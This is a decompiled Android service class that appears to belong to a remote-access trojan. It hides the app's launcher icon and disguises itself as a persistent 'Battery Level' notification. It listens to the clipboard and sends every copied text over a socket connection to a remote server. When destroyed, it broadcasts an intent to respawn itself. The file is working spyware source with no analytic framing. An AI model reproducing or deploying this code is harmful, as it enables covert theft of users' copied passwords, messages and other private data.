package com.example.project20;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {
    static final /* synthetic */ boolean $assertionsDisabled = false;
    private static Context contextOfApplication;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);
        if (Build.VERSION.SDK_INT > 26) {
            startMyOwnForeground();
        } else {
            startForeground(1, new Notification());
        }
    }

    private void startMyOwnForeground() {
        NotificationChannel notificationChannel = new NotificationChannel("example.permanence", "Battery Level Service", 0);
        notificationChannel.setLightColor(-16776961);
        notificationChannel.setLockscreenVisibility(0);
        ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannel);
        startForeground(1, new NotificationCompat.Builder(this, "example.permanence").setOngoing(true).setContentTitle("Battery Level").setPriority(1).setCategory(NotificationCompat.CATEGORY_SERVICE).build());
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        super.onStartCommand(intent, i, i2);
        ((ClipboardManager) getSystemService("clipboard")).addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
            /* class com.example.project20.MainService.AnonymousClass1 */

            public void onPrimaryClipChanged() {
                CharSequence text;
                ClipboardManager clipboardManager = (ClipboardManager) MainService.this.getSystemService("clipboard");
                if (clipboardManager.hasPrimaryClip()) {
                    ClipData primaryClip = clipboardManager.getPrimaryClip();
                    if (primaryClip.getItemCount() > 0 && (text = primaryClip.getItemAt(0).getText()) != null) {
                        try {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("text", text);
                            IOSocket.getInstance().getIoSocket().emit("0xCB", jSONObject);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        });
        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return 1;
    }

    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("respawnService"));
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
}
